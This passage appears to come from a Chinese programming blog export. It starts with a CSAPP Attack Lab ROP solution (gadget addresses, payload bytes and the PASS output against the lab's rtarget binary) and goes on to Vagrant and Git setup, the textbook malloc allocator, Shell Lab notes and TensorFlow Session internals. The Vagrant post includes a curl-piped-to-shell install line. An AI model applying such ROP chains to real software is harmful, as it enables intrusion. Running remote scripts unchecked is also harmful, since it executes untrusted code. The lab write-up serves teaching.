顺着代码查找，很快就可以找到一个gadget: 58 90 c3 pop %rax; ret;，地址在0x4019cc. 12300000000004019ca &lt;getval_280&gt;: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 接着查找mov %rax %rdi对应的字节码48 89 c7。直接搜索48 89 c7 c3, 地址在0x4019a2. 12300000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq 最终形成的字符输入为： 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00cc 19 40 00 00 00 00 00 # pop %rax; retfa 97 b9 59 00 00 00 00 # cookiea2 19 40 00 00 00 00 00 # mov %rax %rdi; ret;ec 17 40 00 00 00 00 00 # touch2的返回地址 执行结果为 123456789$ cat phase4.txt| ./hex2raw| ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00","tags":[{"name":"CSAPP","slug":"CSAPP","permalink":"http://larryim.cc/tags/CSAPP/"}],"categories":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"http://larryim.cc/categories/CSAPP-Lab/"}]},{"title":"vagrant搭建ubuntu","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/awesome-Install-vagrant搭建ubuntu/","text":"Vagrant 是一款用来管理虚拟机的工具，可以构建虚拟开发环境的。Vagrant封装一个Linux(Ubuntu/CentOS等)的开发环境，分享给其他开发人员。而其他人可以在自己喜欢的桌面系统（Mac/Windows/Linux）上开发程序，代码却能统一在封装好的环境里运行，可以把开发环境配制成与生产环境一样。 Mac terminal下的Vagrant和 Ubuntu环境的安装Vagrant可以从下面网页链接下载, 选择 ：https://www.vagrantup.com/downloads.html 安装好了Vagrant，后然后安装Virtualbox，请到下载网页直接下载需要的版本。 下面安装Ubuntu（1）打开Mac terminal，运行下面命令，安装Ubuntu。 12$ vagrant init ubuntu/trusty64$ vagrant up 其他的系统版本选择见https://app.vagrantup.com/boxes/search, 最常用的是ubuntu/trusty64和ubuntu/xenial64. 键入vagrant up后，vagrant会下载您指定的操作系统，然后进行安装。整个下载安装过程一般在5分钟左右。 (2)连接到安装好的Ubuntu 12// 这个命令会通过ssh的方式连接虚拟机。$ vagrant ssh 分享文件打开位于配置文件Vagrantfile，配置其中的config.vm.synced_folder参数,第一个参数是需要位于主机需要同步的文件夹，可以是相对地址。第二个参数是虚拟机上的需要同步的文件夹，必须是绝对地址。 12345Vagrant.configure(&quot;2&quot;) do |config| # other config here config.vm.synced_folder &quot;src/&quot;, &quot;/home/shared&quot;end NOTE: By default, Vagrant will share your project directory (the directory with the Vagrantfile) to /vagrant. 安装和配置ubuntu这其实和正常的ubuntu系统一样的。一般通过 1sudo apt-get install software 安装软件。 安装常用软件12345sudo apt-get updatesudo apt-get install gitsudo apt-get install gdbsudo apt-get install zshsh -c \"$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" // install on-my-zsh vagrant虚拟机默认密码是vagrant 常用命令12345678910111213141516vagrant box add &#123;作者/系统名&#125; &#123;box文件路径&#125; #添加虚拟机vagrant box remove &#123;作者/系统名&#125; #删除虚拟机vagrant init &#123;作者/系统名&#125; #初化化虚拟机此时会生成一个Vagrantfile文件vagrant box list #查年现有的虚拟机vagrant status #查看所有虚拟机状态vagrant halt &#123;作者/系统名&#125; #关闭指定虚拟机vagrant provision #当修改完配制后只要执行一下此命令就可以对虚拟机进行相关修改vagrant reload #重启虚拟机vagrant ssh #使用ssh的方式连接虚拟机vagrant up #启动虚拟机vagrant version #查看版本信息vagrant plugin &#123;插件&#125; #安装插件vagrant package &#123;作者/系统名&#125; #把你的虚拟机打包在box可以分享给你拉小人类伴们一起使用，非常方便vagrant resume #恢复虚拟机vagrant suspend #暂停虚拟机vagrant destroy #销毁当前虚拟机 加载已经下载/存在的虚拟机有时候虚拟机已经存在，或者你通过其他途径下载虚拟机更快，或者你从朋友那里拷贝了一个虚拟机，那么可不可以直接加载呢？ 当然是可以的，而且一句话搞定，例如添加文件名为path_to_file.box的虚拟机以my_box_name的名字展现： 1vagrant box add my_box_name file:///path_to_file.box","tags":[{"name":"vagrant","slug":"vagrant","permalink":"http://larryim.cc/tags/vagrant/"},{"name":"ubuntu","slug":"ubuntu","permalink":"http://larryim.cc/tags/ubuntu/"}],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"Records","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/Python-Records/","text":"Get key name from Python KeyError exception1234try: x2 = myDict['key2']except KeyError as e: print e.args[0] How to print without newline or space?1print('.', end='')","tags":[],"categories":[{"name":"Python","slug":"Python","permalink":"http://larryim.cc/categories/Python/"}]},{"title":"static用法","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/C-static用法/","text":"static在C语言中是非常重要的关键字，但是它很容易被理解错误。因为static可以出现在多个地方，有着不同的含义： static 全局变量 static 局部变量 static 函数 根本原因是[1]: 当一个全局变量被声明为static(静态全局变量)时，它的存储位置并没有改变，还在虚拟内存的.data段（已初始化数据）。但是它只在定义它的源文件内有效，其他源文件无法访问它。它最重要的改变是链接属性的改变：静态变量的初始化在链接时已完成，如果显示指定初始值，则初始化为0。 每次函数调用静态局部变量的时候都修改它然后离开，下次读的时候从全局存储区读出的静态局部变量就是上次修改后的值。 References Pointers on C, page 61","tags":[{"name":"C","slug":"C","permalink":"http://larryim.cc/tags/C/"},{"name":"static","slug":"static","permalink":"http://larryim.cc/tags/static/"}],"categories":[{"name":"C","slug":"C","permalink":"http://larryim.cc/categories/C/"}]},{"title":"Lab6 Malloc Lab","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/CSAPP-Lab-Malloc-lab/","text":"Malloc Lab的目的是设计一个通用分配器。它基于隐式空闲链表，使用立即边界标记合并方式。 分配器包含在一个源文件mm.c中，这次Lab需要完成四个函数: 1234int mm_init(void); /* 初始化分配器 */void *mm_malloc(size_t size); /* malloc */void mm_free(void *ptr); /* free */void *mm_realloc(void *ptr, size_t size); /* realloc */ 堆的示意图如下所示。 最后发现这个lab的答案书上竟然已经写出来了，写的特别好，借鉴一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390/* * Simple, 32-bit and 64-bit clean allocator based on implicit free * lists, first-fit placement, and boundary tag coalescing, as described * in the CS:APP3e text. Blocks must be aligned to doubleword (8 byte) * boundaries. Minimum block size is 16 bytes. */#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include \"mm.h\"#include \"memlib.h\"/* * If NEXT_FIT defined use next fit search, else use first-fit search */#define NEXT_FITx/* $begin mallocmacros *//* Basic constants and macros */#define WSIZE 4 /* Word and header/footer size (bytes) */ //line:vm:mm:beginconst#define DSIZE 8 /* Double word size (bytes) */#define CHUNKSIZE (1&lt;&lt;12) /* Extend heap by this amount (bytes) */ //line:vm:mm:endconst#define MAX(x, y) ((x) &gt; (y)? (x) : (y))/* Pack a size and allocated bit into a word */#define PACK(size, alloc) ((size) | (alloc)) //line:vm:mm:pack/* Read and write a word at address p */#define GET(p) (*(unsigned int *)(p)) //line:vm:mm:get#define PUT(p, val) (*(unsigned int *)(p) = (val)) //line:vm:mm:put/* Read the size and allocated fields from address p */#define GET_SIZE(p) (GET(p) &amp; ~0x7) //line:vm:mm:getsize#define GET_ALLOC(p) (GET(p) &amp; 0x1) //line:vm:mm:getalloc/* Given block ptr bp, compute address of its header and footer */#define HDRP(bp) ((char *)(bp) - WSIZE) //line:vm:mm:hdrp#define FTRP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) //line:vm:mm:ftrp/* Given block ptr bp, compute address of next and previous blocks */#define NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE))) //line:vm:mm:nextblkp#define PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) //line:vm:mm:prevblkp/* $end mallocmacros *//* Global variables */static char *heap_listp = 0; /* Pointer to first block */#ifdef NEXT_FITstatic char *rover; /* Next fit rover */#endif/* Function prototypes for internal helper routines */static void *extend_heap(size_t words);static void place(void *bp, size_t asize);static void *find_fit(size_t asize);static void *coalesce(void *bp);static void printblock(void *bp);static void checkheap(int verbose);static void checkblock(void *bp);/* * mm_init - Initialize the memory manager *//* $begin mminit */int mm_init(void)&#123; /* Create the initial empty heap */ if ((heap_listp = mem_sbrk(4*WSIZE)) == (void *)-1) //line:vm:mm:begininit return -1; PUT(heap_listp, 0); /* Alignment padding */ PUT(heap_listp + (1*WSIZE), PACK(DSIZE, 1)); /* Prologue header */ PUT(heap_listp + (2*WSIZE), PACK(DSIZE, 1)); /* Prologue footer */ PUT(heap_listp + (3*WSIZE), PACK(0, 1)); /* Epilogue header */ heap_listp += (2*WSIZE); //line:vm:mm:endinit /* $end mminit */#ifdef NEXT_FIT rover = heap_listp;#endif /* $begin mminit */ /* Extend the empty heap with a free block of CHUNKSIZE bytes */ if (extend_heap(CHUNKSIZE/WSIZE) == NULL) return -1; return 0;&#125;/* $end mminit *//* * mm_malloc - Allocate a block with at least size bytes of payload *//* $begin mmmalloc */void *mm_malloc(size_t size)&#123; size_t asize; /* Adjusted block size */ size_t extendsize; /* Amount to extend heap if no fit */ char *bp; /* $end mmmalloc */ if (heap_listp == 0)&#123; mm_init(); &#125; /* $begin mmmalloc */ /* Ignore spurious requests */ if (size == 0) return NULL; /* Adjust block size to include overhead and alignment reqs. */ if (size &lt;= DSIZE) //line:vm:mm:sizeadjust1 asize = 2*DSIZE; //line:vm:mm:sizeadjust2 else asize = DSIZE * ((size + (DSIZE) + (DSIZE-1)) / DSIZE); //line:vm:mm:sizeadjust3 /* Search the free list for a fit */ if ((bp = find_fit(asize)) != NULL) &#123; //line:vm:mm:findfitcall place(bp, asize); //line:vm:mm:findfitplace return bp; &#125; /* No fit found. Get more memory and place the block */ extendsize = MAX(asize,CHUNKSIZE); //line:vm:mm:growheap1 if ((bp = extend_heap(extendsize/WSIZE)) == NULL) return NULL; //line:vm:mm:growheap2 place(bp, asize); //line:vm:mm:growheap3 return bp;&#125;/* $end mmmalloc *//* * mm_free - Free a block *//* $begin mmfree */void mm_free(void *bp)&#123; /* $end mmfree */ if (bp == 0) return; /* $begin mmfree */ size_t size = GET_SIZE(HDRP(bp)); /* $end mmfree */ if (heap_listp == 0)&#123; mm_init(); &#125; /* $begin mmfree */ PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size, 0)); coalesce(bp);&#125;/* $end mmfree *//* * coalesce - Boundary tag coalescing. Return ptr to coalesced block *//* $begin mmfree */static void *coalesce(void *bp)&#123; size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp))); size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp))); size_t size = GET_SIZE(HDRP(bp)); if (prev_alloc &amp;&amp; next_alloc) &#123; /* Case 1 */ return bp; &#125; else if (prev_alloc &amp;&amp; !next_alloc) &#123; /* Case 2 */ size += GET_SIZE(HDRP(NEXT_BLKP(bp))); PUT(HDRP(bp), PACK(size, 0)); PUT(FTRP(bp), PACK(size,0)); &#125; else if (!prev_alloc &amp;&amp; next_alloc) &#123; /* Case 3 */ size += GET_SIZE(HDRP(PREV_BLKP(bp))); PUT(FTRP(bp), PACK(size, 0)); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); &#125; else &#123; /* Case 4 */ size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp))); PUT(HDRP(PREV_BLKP(bp)), PACK(size, 0)); PUT(FTRP(NEXT_BLKP(bp)), PACK(size, 0)); bp = PREV_BLKP(bp); &#125; /* $end mmfree */#ifdef NEXT_FIT /* Make sure the rover isn't pointing into the free block */ /* that we just coalesced */ if ((rover &gt; (char *)bp) &amp;&amp; (rover &lt; NEXT_BLKP(bp))) rover = bp;#endif /* $begin mmfree */ return bp;&#125;/* $end mmfree *//* * mm_realloc - Naive implementation of realloc */void *mm_realloc(void *ptr, size_t size)&#123; size_t oldsize; void *newptr; /* If size == 0 then this is just free, and we return NULL. */ if(size == 0) &#123; mm_free(ptr); return 0; &#125; /* If oldptr is NULL, then this is just malloc. */ if(ptr == NULL) &#123; return mm_malloc(size); &#125; newptr = mm_malloc(size); /* If realloc() fails the original block is left untouched */ if(!newptr) &#123; return 0; &#125; /* Copy the old data. */ oldsize = GET_SIZE(HDRP(ptr)); if(size &lt; oldsize) oldsize = size; memcpy(newptr, ptr, oldsize); /* Free the old block. */ mm_free(ptr); return newptr;&#125;/* * mm_checkheap - Check the heap for correctness */void mm_checkheap(int verbose)&#123; checkheap(verbose);&#125;/* * The remaining routines are internal helper routines *//* * extend_heap - Extend heap with free block and return its block pointer *//* $begin mmextendheap */static void *extend_heap(size_t words)&#123; char *bp; size_t size; /* Allocate an even number of words to maintain alignment */ size = (words % 2) ? (words+1) * WSIZE : words * WSIZE; //line:vm:mm:beginextend if ((long)(bp = mem_sbrk(size)) == -1) return NULL; //line:vm:mm:endextend /* Initialize free block header/footer and the epilogue header */ PUT(HDRP(bp), PACK(size, 0)); /* Free block header */ //line:vm:mm:freeblockhdr PUT(FTRP(bp), PACK(size, 0)); /* Free block footer */ //line:vm:mm:freeblockftr PUT(HDRP(NEXT_BLKP(bp)), PACK(0, 1)); /* New epilogue header */ //line:vm:mm:newepihdr /* Coalesce if the previous block was free */ return coalesce(bp); //line:vm:mm:returnblock&#125;/* $end mmextendheap *//* * place - Place block of asize bytes at start of free block bp * and split if remainder would be at least minimum block size *//* $begin mmplace *//* $begin mmplace-proto */static void place(void *bp, size_t asize)/* $end mmplace-proto */&#123; size_t csize = GET_SIZE(HDRP(bp)); if ((csize - asize) &gt;= (2*DSIZE)) &#123; PUT(HDRP(bp), PACK(asize, 1)); PUT(FTRP(bp), PACK(asize, 1)); bp = NEXT_BLKP(bp); PUT(HDRP(bp), PACK(csize-asize, 0)); PUT(FTRP(bp), PACK(csize-asize, 0)); &#125; else &#123; PUT(HDRP(bp), PACK(csize, 1)); PUT(FTRP(bp), PACK(csize, 1)); &#125;&#125;/* $end mmplace *//* * find_fit - Find a fit for a block with asize bytes *//* $begin mmfirstfit *//* $begin mmfirstfit-proto */static void *find_fit(size_t asize)/* $end mmfirstfit-proto */&#123; /* $end mmfirstfit */#ifdef NEXT_FIT /* Next fit search */ char *oldrover = rover; /* Search from the rover to the end of list */ for ( ; GET_SIZE(HDRP(rover)) &gt; 0; rover = NEXT_BLKP(rover)) if (!GET_ALLOC(HDRP(rover)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(rover)))) return rover; /* search from start of list to old rover */ for (rover = heap_listp; rover &lt; oldrover; rover = NEXT_BLKP(rover)) if (!GET_ALLOC(HDRP(rover)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(rover)))) return rover; return NULL; /* no fit found */#else /* $begin mmfirstfit */ /* First-fit search */ void *bp; for (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp)) &#123; if (!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) &#123; return bp; &#125; &#125; return NULL; /* No fit */#endif&#125;/* $end mmfirstfit */static void printblock(void *bp)&#123; size_t hsize, halloc, fsize, falloc; checkheap(0); hsize = GET_SIZE(HDRP(bp)); halloc = GET_ALLOC(HDRP(bp)); fsize = GET_SIZE(FTRP(bp)); falloc = GET_ALLOC(FTRP(bp)); if (hsize == 0) &#123; printf(\"%p: EOL\\n\", bp); return; &#125; printf(\"%p: header: [%ld:%c] footer: [%ld:%c]\\n\", bp, hsize, (halloc ? 'a' : 'f'), fsize, (falloc ? 'a' : 'f'));&#125;static void checkblock(void *bp)&#123; if ((size_t)bp % 8) printf(\"Error: %p is not doubleword aligned\\n\", bp); if (GET(HDRP(bp)) != GET(FTRP(bp))) printf(\"Error: header does not match footer\\n\");&#125;/* * checkheap - Minimal check of the heap for consistency */void checkheap(int verbose)&#123; char *bp = heap_listp; if (verbose) printf(\"Heap (%p):\\n\", heap_listp); if ((GET_SIZE(HDRP(heap_listp)) != DSIZE) || !GET_ALLOC(HDRP(heap_listp))) printf(\"Bad prologue header\\n\"); checkblock(heap_listp); for (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; 0; bp = NEXT_BLKP(bp)) &#123; if (verbose) printblock(bp); checkblock(bp); &#125; if (verbose) printblock(bp); if ((GET_SIZE(HDRP(bp)) != 0) || !(GET_ALLOC(HDRP(bp)))) printf(\"Bad epilogue header\\n\");&#125;","tags":[{"name":"CSAPP","slug":"CSAPP","permalink":"http://larryim.cc/tags/CSAPP/"}],"categories":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"http://larryim.cc/categories/CSAPP-Lab/"}]},{"title":"git","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/awesome-Install-git/","text":"安装git在mac上已经默认安装了，使用之前只需要简单的配置即可。 设置Git的user name和email把下面的username和email替换成您的Github的用户名和地址。 12$ git config --global user.name &quot;username&quot;$ git config --global user.email &quot;email&quot; 生成密钥1$ ssh-keygen -t rsa -C &quot;email&quot; 默认连续3个回车， 最后得到了两个文件：～/.ssh/id_rsa和~/.ssh/id_rsa.pub。注意这两个文件的保存地址(会输出在终端上，等下要用)。 其中公钥保存在id_rsa.pub内。 添加密钥到ssh-agentssh-agent是一种控制用来保存公钥身份验证所使用的私钥的程序，其实ssh-agent就是一个密钥管理器，运行ssh-agent以后，使用ssh-add将私钥id_rsa交给ssh-agent保管，其他程序需要身份验证的时候可以将验证申请交给ssh-agent来完成整个认证过程。 1$ eval &quot;$(ssh-agent -s)&quot; 添加生成的 SSH key 到 ssh-agent。 1$ ssh-add ~/.ssh/id_rsa 登陆Github, 添加ssh复制id_rsa.pub文件里面的内容。 1more .ssh/id_rsa.pub 打开GitHub,依次选择settings-SSH and GPG keys-New SSH key。进入到如下界面，输入任意Title，在Key输入框内粘贴上id_rsa.pub文件里面的内容。 测试一下是否可以连接： 1ssh -T git@github.com 测试成功后，在github页面的SSH keys上的钥匙符号会显示为绿色：","tags":[{"name":"Git","slug":"Git","permalink":"http://larryim.cc/tags/Git/"}],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"Youtube","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/awesome-Install-Youtube/","text":"Youtube-dl可以下载Youtube网页的视频，功能很强大。但Youtube-dl还有个缺点，就是下载时单线程。简直就是龟速，下载视频往往还比较大，单线程是不可能使用的。 1youtube-dl https://www.youtube.com/playlist\\?list\\=PLrmLmBdmIlpslxZUHHWmfOzNn6cA7jvyh --external-downloader aria2c --external-downloader-args \"-x 16 -k 1M\"","tags":[{"name":"Youtube","slug":"Youtube","permalink":"http://larryim.cc/tags/Youtube/"}],"categories":[{"name":"awesome Install","slug":"awesome-Install","permalink":"http://larryim.cc/categories/awesome-Install/"}]},{"title":"Lab5 Shell Lab","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/CSAPP-Lab-Shell-Lab/","text":"Shell Lab需要我们完成一个简单的shell程序。shell是一个交互的命令行界面的解析器。著名的shell程序有Bourne shell (sh)、Bourne-Again shell(bash)、Z shell (zsh)等。shell的框架已经写好，主要需要完成以下函数： void eval(char *cmdline)：解析命令与执行 void sigchld_handler(int sig)：SIGCHLD 信号处理程序 void sigtstp_handler(int sig)：SIGTSTP(ctrl-z) 信号处理程序 void sigint_handler(int sig)：SIGINT(ctrl-c) 信号处理程序 简介shell程序tsh.c应该具备以下功能： 每一行会输出一个 tsh&gt;，然后等待用户输入 用户的输入包括name加上零个或多个参数，这些参数之间用一个或多个空格分隔。如果name是内置命令，那么直接执行，否则需要新建一个子进程，并在子进程中完成具体的工作 不需要支持管道，但是需要支持输入输出重定向，如 tsh&gt; /bin/cat &lt; foo &gt; bar（必须支持在同一行重定向输入以及输出)， 也需要支持内置命令的重定向，如 tsh&gt; jobs &gt; foo 输入 ctrl-c 或 ctrl-z 会给当前的前台进程（包括其子进程）发送 SIGINT(SIGTSTP) 信号，如果没有前台任务，那么这俩信号没有任何效果 如果输入的命令以 &amp; 结尾，那么就要以后台任务的方式执行，否则按照前台执行 每个job都有其进程ID(PID)和job ID(JID)都是由tsh指定的正整数，JID以%开头（如 %5 表示 JID为5，而5则表示PID为5，这部分已提供了辅助函数 支持的内置命令有 quit 退出shell jobs 列出所有的后台任务 bg job 给后台job发送SIGCONT 信号来继续执行该任务，具体的job数值可以是PID或JID fg job 给前台job发送SIGCONT 信号来继续执行该任务，具体的job数值可以是PID或JID tsh应该回收所有的僵尸进程，如果任何job因为接收了没有捕获的信号而终止，tsh应该识别出这个时间并且打印出JID和相关信号的信息。 提示 不要使用 sleep() 来同步 不要使用忙等待 while(1); 使用sigsuspend来同步 竞争条件 僵尸进程回收（注意竞争条件以及正确处理信号） 等待前台任务（仔细思考怎么样才是好的方式） 不要假定进程的执行顺序 子进程挂掉的时候应该在一个限定时间内被回收 不要在多个地方调用waitpid，很容易造成竞争条件，也会造成程序过分复杂 不要使用任何系统调用来管理 terminal group waitpid, kill, fork, execve, setpgid, sigprocmask 和 sigsuspend 都非常有用，waitpid 中的 WUNTRACED 和 WNOHANG选项也是如此。 遇到不清晰的用 man 来查看细节 实现 signal handler 的时候注意给全部的前台进程组发送 SIGINT 和 SIGTSTP 信号 在 kill 函数中使用 -pid 的格式作为参数 在shell等待前台工作完成时，需要决定在eval及sigchold handler 具体的分配，这里有一定技巧 在函数 eval 中，在 fork 出子进程之前，必须使用 sigprocmask 来阻塞 SIGCHLD,SIGINT和SIGTSTP信号，完成之后再取消阻塞。调用addjob的时候也需要如此。注意，因为子进程也继承了之前的各种状态，所以在子进程中调用exec执行新程序的时候注意需要取消阻塞，同样也需要恢复默认的handler`（shell 本身已经忽略了这些信号） 不要使用 top, less, vi, emacs 之类的复杂程序，使用简单的文本程序如：/bin/cat, /bin/ls, /bin/ps, /bin/echo 因为毕竟不是真正的 shell，所以在fork之后，execve之前，子进程需要调用 setpgid(0, 0)，这样就把子进程放到一个新的进程组里。这样就保证我们的shell前台进程组中唯一的进程，当按下 ctrl-c时，应该捕获SIGINT信号并发送给对应的前台进程组中。 gdb 操作可能用到的gdb相关操作： （1）改变gdb信号处理的设置 ：设置gdb接收到SIGINT时不要停止、打印、传递给调试目标程序 。 (gdb) handle SIGINT nostop print pass（2）使用gdb命令直接向调试的应用程序发送信号 ：首先在你希望发送信号的语句处设置断点，然后运行程序，当停止到断点所在位置后，用gdb的signal命令发送信号给调试目标程序 。 (gdb) signal SIGINT （3）调试多进程程序：mode到可选值为parent和child表示fork之后调试父进程还是子进程。 (gdb) set follow-fork-mode mode dup/dup2 I/O重定向1234dup, dup2 -- duplicate an existing file descriptor#include &lt;unistd.h&gt;int dup(int newfd);int dup2(int newfd, int oldfd); dup2函数复制描述符表项oldfd到描述符表项newfd，覆盖描述符表项newfd以前的内容。如果newfd已经打开了，dup2会在复制oldfd之前关闭newfd。","tags":[{"name":"CSAPP","slug":"CSAPP","permalink":"http://larryim.cc/tags/CSAPP/"}],"categories":[{"name":"CSAPP Lab","slug":"CSAPP-Lab","permalink":"http://larryim.cc/categories/CSAPP-Lab/"}]},{"title":"TF会话生命周期","date":"2017-12-29T16:00:00.000Z","path":"2017/12/30/TensorFlow-TF会话生命周期/","text":"转自 TensorFlow的系统结构以C API为界，将整个系统分为「前端」和「后端」两个子系统： 前端系统：提供编程模型，负责构造计算图； 后端系统：提供运行时环境，负责执行计算图。 前端系统主要扮演Client的角色，主要负责计算图的构造，并管理Session生命周期过程。 前端系统是一个支持多语言的编程环境，并提供统一的编程模型支撑用户构造计算图。Client通过Session，连接TensorFlow后端的「运行时」，启动计算图的执行过程。 后端系统是TensorFlow的运行时系统，主要负责计算图的执行过程，包括计算图的剪枝，设备分配，子图计算等过程。 本文首先以Session创建为例，揭示前端Python与后端C/C++系统实现的通道，阐述TensorFlow多语言编程的奥秘。随后，以Python前端，C API桥梁，C++后端为生命线，阐述Session的生命周期过程。 Swig: 幕后英雄前端多语言编程环境与后端C/C++实现系统的通道归功于Swig的包装器。TensorFlow使用Bazel的构建工具，在编译之前启动Swig的代码生成过程，通过tf_session.i自动生成了两个适配(Wrapper)文件： pywrap_tensorflow.py: 负责对接上层Python调用； pywrap_tensorflow.cpp: 负责对接下层C实现。 此外，pywrap_tensorflow.py模块首次被加载时，自动地加载_pywrap_tensorflow.so的动态链接库。从而实现了pywrap_tensorflow.py到pywrap_tensorflow.cpp的函数调用关系。 在pywrap_tensorflow.cpp的实现中，静态注册了一个函数符号表。在运行时，按照Python的函数名称，匹配找到对应的C函数实现，最终转调到c_api.c的具体实现。 编程接口：Python当Client要启动计算图的执行过程时，先创建了一个Session实例，进而调用父类BaseSession的构造函数。 12345# tensorflow/python/client/session.pyclass Session(BaseSession): def __init__(self, target='', graph=None, config=None): super(Session, self).__init__(target, graph, config=config) # ignoring others 在BaseSession的构造函数中，将调用pywrap_tensorflow模块中的函数。其中，pywrap_tensorflow模块自动由Swig生成。 12345678910111213 # tensorflow/python/client/session.pyfrom tensorflow.python import pywrap_tensorflow as tf_sessionclass BaseSession(SessionInterface):def __init__(self, target='', graph=None, config=None): self._session = None opts = tf_session.TF_NewSessionOptions(target=self._target, config=config) try: with errors.raise_exception_on_not_ok_status() as status: self._session = tf_session.TF_NewDeprecatedSession(opts, status) finally: tf_session.TF_DeleteSessionOptions(opts)# ignoring others 生成代码：Swig1pywrap_tensorflow.py 在pywrap_tensorflow模块中，通过_pywrap_tensorflow将在_pywrap_tensorflow.so中调用对应的C++函数实现。 123# tensorflow/bazel-bin/tensorflow/python/pywrap_tensorflow.pydef TF_NewDeprecatedSession(arg1, status): return _pywrap_tensorflow.TF_NewDeprecatedSession(arg1, status) 在pywrap_tensorflow.cpp的具体实现中，它静态注册了函数调用的符号表，实现Python的函数名称到C++实现函数的具体映射。 12345678910111213# tensorflow/bazel-bin/tensorflow/python/pywrap_tensorflow.cppstatic PyMethodDef SwigMethods[] = &#123; ... &#123;\"TF_NewDeprecatedSession\", _wrap_TF_NewDeprecatedSession, METH_VARARGS, NULL&#125;,&#125;PyObject *_wrap_TF_NewDeprecatedSession(PyObject *self, PyObject *args) &#123;TF_SessionOptions* arg1 = ... TF_Status* arg2 = ...TF_DeprecatedSession* result = TF_NewDeprecatedSession(arg1, arg2);// ignoring others implements&#125; 最终，自动生成的pywrap_tensorflow.cpp仅仅负责函数调用的转发，最终将调用底层C系统向上提供的API接口。 C API：桥梁c_api.h是TensorFlow的后端执行系统面向前端开放的公共API接口之一，自此将进入TensorFlow后端系统的浩瀚天空。 1234567891011// tensorflow/c/c_api.cTF_DeprecatedSession* TF_NewDeprecatedSession( const TF_SessionOptions*, TF_Status* status) &#123; Session* session; status-&gt;status = NewSession(opt-&gt;options, &amp;session); if (status-&gt;status.ok()) &#123; return new TF_DeprecatedSession(&#123;session&#125;); &#125; else &#123; return NULL; &#125;&#125; 后端系统：C++NewSession将根据前端传递的Session.target，使用SessionFactory多态创建不同类型的Session(C++)对象。 1234567891011121314Status NewSession(const SessionOptions&amp; options, Session** out_session) &#123; SessionFactory* factory; Status s = SessionFactory::GetFactory(options, &amp;factory); if (!s.ok()) &#123; *out_session = nullptr; LOG(ERROR) &lt;&lt; s; return s; &#125; *out_session = factory-&gt;NewSession(options); if (!*out_session) &#123; return errors::Internal(\"Failed to create session.\"); &#125; return Status::OK();&#125; 会话生命周期下文以前端Python，桥梁C API，后端C++为生命线，理顺三者之间的调用关系，阐述Session的生命周期过程。 在Python前端，Session的生命周期主要体现在： 创建Session(target) 迭代执行Session.run(fetches, feed_dict) Session._extend_graph(graph) Session.TF_Run(feeds, fetches, targets) 关闭Session 销毁Session 12345sess = Session(target)for _ in range(1000): batch_xs, batch_ys = mnist.train.next_batch(100) sess.run(train_step, feed_dict=&#123;x: batch_xs, y_: batch_ys&#125;)sess.close() 相应地，C++后端，Session的生命周期主要体现在： 根据target多态创建Session Session.Create(graph)：有且仅有一次 Session.Extend(graph)：零次或多次 迭代执行Session.Run(inputs, outputs, targets) 关闭Session.Close 销毁Session对象 123456789101112131415161718192021222324// create/load graph ...tensorflow::GraphDef graph;// local runtime, target is \"\"tensorflow::SessionOptions options;// create Sessionstd::unique_ptr&lt;tensorflow::Session&gt; sess(tensorflow::NewSession(options));// create graph at initialization.tensorflow::Status s = 